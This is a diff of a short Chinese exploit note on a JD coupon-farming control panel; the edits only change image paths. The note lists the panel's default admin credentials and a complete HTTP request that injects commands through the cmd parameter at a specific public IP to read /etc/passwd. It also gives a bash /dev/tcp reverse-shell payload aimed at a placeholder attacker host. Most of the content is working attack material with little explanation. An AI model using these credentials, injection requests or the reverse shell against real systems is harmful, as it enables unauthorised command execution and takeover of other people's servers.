@@ -22,21 +22,17 @@ title="京东薅羊毛控制面板"
 
 访问后登录页面如下
 
-![](images/202202101952995.png)
-
-
+![](../.gitbook/assets/202202101952995.png)
 
 默认账号密码为
 
 **useradmin/supermanito**
 
-![](images/202202101952574.png)
-
-
+![](../.gitbook/assets/202202101952574.png)
 
 发送如下请求包执行命令
 
-```plain
+```
 POST /runCmd HTTP/1.1
 Host: 101.200.189.251:5678
 Content-Length: 50
@@ -54,26 +50,16 @@ Connection: close
 cmd=bash+jd.sh+%3Bcat /etc/passwd%3B+now&delay=500
 ```
 
-
-
 其中 cmd 参数存在命令注入
 
-
-
-![](images/202202101952947.png)
-
-
+![](../.gitbook/assets/202202101952947.png)
 
 反弹shell
 
-
-
-```plain
+```
 cmd=bash+jd.sh+%3Bbash+-c+'exec+bash+-i+%26%3E%2Fdev%2Ftcp%2Fxxx.xxx.xxx.xxx%2F9999+%3C%261'%3B+now&delay=500
 ```
 
+![](../.gitbook/assets/202202101952367.png)
 
-
-![](images/202202101952367.png)
-
-## 
+##
